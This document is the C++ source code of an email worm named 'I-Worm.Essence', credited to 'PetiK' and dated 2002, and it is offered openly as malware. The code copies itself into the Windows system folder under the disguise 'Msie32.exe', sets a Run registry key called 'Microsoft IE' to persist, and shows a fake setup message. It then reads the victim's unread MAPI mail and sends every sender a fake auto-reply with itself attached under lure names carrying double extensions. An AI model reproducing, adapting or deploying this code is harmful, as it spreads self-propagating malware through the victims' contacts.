   /*
   Name : I-Worm.Essence
   Author : PetiK
   Date : February 3rd 2002
   Language : C++

   Thanx to Bumblebee.


   */

   #include <windows.h>
   #include <mapi.h>
   #include <memory.h>
   #pragma argused

   void Welcome();
   void attachname();
   void sendmail(LHANDLE sess, char *msubject, char *mbody, char *mailaddr);

   char    filename[100],sysdir[100],sysdr[100],attname[20];
   LPSTR   Run="Software\\Microsoft\\Windows\\CurrentVersion\\Run";

   HINSTANCE   hMAPI;
   LHANDLE     sess;
   MapiMessage *mess;
   char        messId[512];
   char        subject[1024],
           address[1024],
           server[1024],
           body[8192];
   long        i,j;
   char        *tmp;

   MSG     msg;
   HKEY        hReg;


   ULONG (PASCAL FAR *mSendMail)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);
   ULONG (PASCAL FAR *mLogoff)(LHANDLE, ULONG, FLAGS, ULONG);
   ULONG (PASCAL FAR *mLogon)(ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPLHANDLE);
   ULONG (PASCAL FAR *mFindNext)(LHANDLE, ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPTSTR);
   ULONG (PASCAL FAR *mReadMail)(LHANDLE, ULONG, LPTSTR, FLAGS, ULONG, lpMapiMessage FAR *);
   ULONG (PASCAL FAR *mSaveMail)(LHANDLE, ULONG, lpMapiMessage, FLAGS, ULONG, LPTSTR);
   ULONG (PASCAL FAR *mFreeBuffer)(LPVOID);

   int WINAPI WinMain (HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
   {
   GetModuleFileName(hInst,filename,100);
   GetSystemDirectory((char *)sysdir,100);

   strcpy(sysdr,sysdir);
   strcat(sysdr,"\\MSIE32.EXE");
   if((lstrcmp(filename,sysdr))!=0) {
       Welcome();
       strcat(sysdir,"\\Msie32.exe");
       CopyFile(filename,sysdir,FALSE);
       RegOpenKeyEx(HKEY_LOCAL_MACHINE,Run,0,KEY_WRITE,&hReg);
       RegSetValueEx(hReg,"Microsoft IE",0,REG_SZ,(BYTE *)sysdir,100);
       RegCloseKey(hReg);
   //  WriteProfileString("WINDOWS","RUN",sysdir);
   //  WriteProfileString(NULL,NULL,NULL);
       return 0;
       }

   hMAPI=LoadLibrary("MAPI32.DLL");
       if(!hMAPI)
       return -1;
   (FARPROC &)mLogon=GetProcAddress(hMAPI, "MAPILogon");
       if(!mLogon)
       return -1;
   (FARPROC &)mLogoff=GetProcAddress(hMAPI, "MAPILogoff");
       if(!mLogoff)
       return -1;
   (FARPROC &)mFindNext=GetProcAddress(hMAPI, "MAPIFindNext");
       if(!mFindNext)
       return -1;
   (FARPROC &)mReadMail=GetProcAddress(hMAPI, "MAPIReadMail");
       if(!mReadMail)
       return -1;
   (FARPROC &)mSaveMail=GetProcAddress(hMAPI, "MAPISaveMail");
       if(!mSaveMail)
       return -1;
   (FARPROC &)mSendMail=GetProcAddress(hMAPI, "MAPISendMail");
       if(!mSendMail)
       return -1;
   (FARPROC &)mFreeBuffer=GetProcAddress(hMAPI, "MAPIFreeBuffer");
       if(!mFreeBuffer)
       return -1;

   mLogon(NULL,NULL,NULL,MAPI_NEW_SESSION,NULL,&sess);
   SetThreadPriority(NULL,THREAD_PRIORITY_LOWEST);
   while(GetMessage(&msg,NULL,0,0))
   if(mFindNext(sess,0,NULL,NULL,MAPI_LONG_MSGID|MAPI_UNREAD_ONLY,NULL,messId)==SUCCESS_SUCCESS) {
       do {
       if(mReadMail(sess,NULL,messId,MAPI_ENVELOPE_ONLY|MAPI_PEEK,NULL,&mess)==SUCCESS_SUCCESS) {
           if(lstrlen(mess->lpszSubject)>2)
           if(mess->lpszSubject[strlen(mess->lpszSubject)-1]!=' ' && mess->lpszSubject[strlen(mess->lpszSubject)-2]!=' ') {
           mFreeBuffer(mess);
           SetThreadPriority(NULL,THREAD_PRIORITY_HIGHEST);
           if(mReadMail(sess,NULL,messId,MAPI_SUPPRESS_ATTACH|MAPI_PEEK,NULL,&mess)==SUCCESS_SUCCESS) {
           body[0]=0;
           if(mess->lpszNoteText) {
               wsprintf(body,"Hi '%s', you wrote me :\n##########\n- ",mess->lpOriginator->lpszName);
               for(i=0,j=lstrlen(body);i<lstrlen(mess->lpszNoteText) && j<512;i++,j++) {
               body[j]=mess->lpszNoteText[i];
               if(body[j]=='\n') {
                   body[j]=0;
                   lstrcat(body,"\n- ");
                   j+=2;
               }
               }
               body[j]=0;
           }
           for(i=0;j<lstrlen(address) && address[i]!='@';i++);
           if(i>lstrlen(address))
               wsprintf(body,"smtp.%s",address+i+1);
           else
               wsprintf(body,"smtp.yahoo.com");
           if(j>=512)
               lstrcat(body,"...");
           else
               lstrcat(body," ");
           wsprintf(body+strlen(body),"\n##########\n\n %s auto-reply:\n\n",server);
           lstrcat(body,"I can not reply now.\nLook at this attachment and mail me if you have some suggests.\n\n");
           wsprintf(subject,"Re: %s  ",mess->lpszSubject);
           wsprintf(address,"%s",mess->lpOriginator->lpszAddress);
           MessageBox(NULL,body,subject,MB_OK|MB_ICONINFORMATION);
           sendmail(sess,subject,body,address);
           tmp=(char *)malloc(strlen(mess->lpszSubject)+3);
           strcpy(tmp,mess->lpszSubject);
           free(mess->lpszSubject);
           tmp[strlen(tmp)+2]=0;
           tmp[strlen(tmp)]=' ';
           tmp[strlen(tmp)-1]=' ';
           mess->lpszSubject=tmp;
           mSaveMail(sess,NULL,mess,MAPI_LONG_MSGID,NULL,messId);
           mFreeBuffer(mess);
           SetThreadPriority(NULL,THREAD_PRIORITY_LOWEST);
           }
           } else
           mFreeBuffer(mess);
       }
       } while(mFindNext(sess,0,NULL,messId,MAPI_LONG_MSGID|MAPI_UNREAD_ONLY,NULL,messId)==SUCCESS_SUCCESS);
   }
   mLogoff(sess,0,0,0);
   FreeLibrary(hMAPI);

   }

   void sendmail(LHANDLE sess, char *msubject, char *mbody, char *mailaddr)
   {
   char    *name[]={"readme","clickme","lookthis","urgent","newgame","winanholiday",
           "hello","ForU","important"};
   char    *ext1[]={".mp3",".htm",".jpg",".gif",".html",".mpeg",".mpg",".htm",".vbs",
           ".zip",".rar"};
   char    *ext2[]={".exe",".com",".pif",".scr"};
   attname[0]=0;
   strcat(attname,name[GetTickCount()&8]);
   strcat(attname,ext1[GetTickCount()&10]);
   strcat(attname,ext2[GetTickCount()&3]);

   MapiMessage mes;
   MapiRecipDesc from;
   memset(&mes,0,sizeof(MapiMessage));
   memset(&from,0,sizeof(MapiRecipDesc));
   from.lpszName=NULL;
   from.ulRecipClass=MAPI_ORIG;
   mes.lpszSubject=msubject;
   mes.lpszNoteText=mbody;

   mes.lpRecips=(MapiRecipDesc *)malloc(sizeof(MapiRecipDesc));
       if(!mes.lpRecips)
       return;
   memset(mes.lpRecips,0,sizeof(MapiRecipDesc));
   mes.lpRecips->lpszName=mailaddr;
   mes.lpRecips->lpszAddress=mailaddr;
   mes.lpRecips->ulRecipClass=MAPI_TO;
   mes.nRecipCount=1;

   mes.lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
       if(!mes.lpFiles)
       return;
   memset(mes.lpFiles,0,sizeof(MapiFileDesc));
   mes.lpFiles->lpszPathName=filename;
   mes.lpFiles->lpszFileName=attname;
   mes.nFileCount=1;

   mes.lpOriginator=&from;

   mSendMail(sess,0,&mes,0,0);

   free(mes.lpRecips);
   free(mes.lpFiles);
   }

   void Welcome()
   {
   Sleep(750);
   MessageBox(NULL,"Software installed on the system.","SETUP",MB_OK|MB_ICONINFORMATION);
   }
